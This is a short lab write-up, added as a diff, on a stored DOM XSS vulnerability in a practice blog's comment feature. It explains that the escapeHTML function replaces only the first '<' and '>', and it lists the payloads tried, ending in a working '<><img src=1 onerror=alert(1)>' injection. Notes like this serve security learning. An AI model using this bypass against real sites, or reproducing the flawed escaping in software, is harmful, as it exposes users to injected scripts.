@@ -1,0 +1,24 @@
+Lab #7 - Stored DOM XSS
+
+Vulnerability - This lab demonstrates a stored DOM vulnerability in the blog comment functionality. 
+
+Goal - To solve this lab, exploit this vulnerability to call the alert() function.
+
+Analysis:
+1. Post a comment and see in the loadCommentWithVulnerableEscape.js has:
+=> a sink: 
+    let commentBodyPElement = document.createElement("p");
+    commentBodyPElement.innerHTML = escapeHTML(comment.body)
+=> and function escapeHTML is not good because it is using replace function with string, which replaces only the first occurrence of a word or character by default.
+
+2. Post a comment: <h1>Hello</h1>
+=> And see that the comment is displayed like this: <h1>Hello
+=> </h1> is not replaced with &gt and &lt
+
+3. Adjusting the payload: <h1><h1>Hello</h1>
+=> See a Hello heading is displayed on the screen
+
+4. Adjusting the payload again to create a alert popup on the screen:
+<><img src=1 onerror=alert(1)>
+
+=> SUCCESSFULLY
